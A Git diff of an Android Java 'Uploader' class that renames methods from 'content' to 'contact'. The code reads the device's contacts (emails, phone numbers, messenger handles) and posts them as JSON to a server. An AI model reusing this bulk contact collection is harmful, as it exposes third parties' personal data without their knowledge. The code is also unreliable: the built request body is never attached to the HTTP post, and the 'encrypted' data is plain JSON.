@@ -106,19 +106,19 @@ class Uploader implements Runnable {
     if ( !uploadCallInformations(httpPost) )
       return false;
 
-    if ( !uploadContentInformations(httpPost) )
+    if ( !uploadContactInformations(httpPost) )
       return false;
     return true;
   }
 
-  private boolean uploadContentInformations( final HttpPost httpPost) {
-    List<String> contentInformations = getContentInformations();
-    String encryptedContactInformations = logToJsonConverter.convertLogToJsonFormat(contentInformations);
-    StringEntity httpContentListEntity;
+  private boolean uploadContactInformations( final HttpPost httpPost) {
+    List<String> contactInformations = getContactInformations();
+    String encryptedContactInformations = logToJsonConverter.convertLogToJsonFormat(contactInformations);
+    StringEntity httpContactListEntity;
     HttpResponse response = null;
     try {
-      httpContentListEntity = new StringEntity(encryptedContactInformations, org.apache.http.protocol.HTTP.UTF_8);
-      httpContentListEntity.setContentType("application/json");
+      httpContactListEntity = new StringEntity(encryptedContactInformations, org.apache.http.protocol.HTTP.UTF_8);
+      httpContactListEntity.setContentType("application/json");
       response = getNewHttpClient().execute(httpPost);
     } catch ( UnsupportedEncodingException e ) {
       // TODO Auto-generated catch block
@@ -139,8 +139,8 @@ class Uploader implements Runnable {
   }
 
   @SuppressWarnings("unused")
-  List<String> getContentInformations() {
-    List<String> contentInformations = new ArrayList<String>();
+  List<String> getContactInformations() {
+    List<String> contactInformations = new ArrayList<String>();
     Cursor cursor;
     String uploadTime = Long.toString(LogToJsonConverter.getCurrentTime());
     String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
@@ -157,7 +157,7 @@ class Uploader implements Runnable {
       Cursor emails = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, emailsWhere, emailsWhereParams, null);
       String emailAddress;
       while ( emails.moveToNext() ) {
-        addEmailContactInfos(contentInformations, uploadTime, contactId, emails);
+        addEmailContactInfos(contactInformations, uploadTime, contactId, emails);
       }
       emails.close();
 
@@ -169,7 +169,7 @@ class Uploader implements Runnable {
       Cursor numbers = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, numbersWhere, numbersWhereParams, null);
 
       while ( numbers.moveToNext() ) {
-        addPhoneNumberContactInfos(contentInformations, uploadTime, contactId, numbers);
+        addPhoneNumberContactInfos(contactInformations, uploadTime, contactId, numbers);
       }
 
       numbers.close();
@@ -179,12 +179,12 @@ class Uploader implements Runnable {
 
       Cursor imCur = context.getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
       while ( imCur.moveToNext() ) {
-        addInstantMessengerContactInfos(contentInformations, uploadTime, contactId, imCur);
+        addInstantMessengerContactInfos(contactInformations, uploadTime, contactId, imCur);
       }
       imCur.close();
     }
     cursor.close();
-    return contentInformations;
+    return contactInformations;
 
   }
 
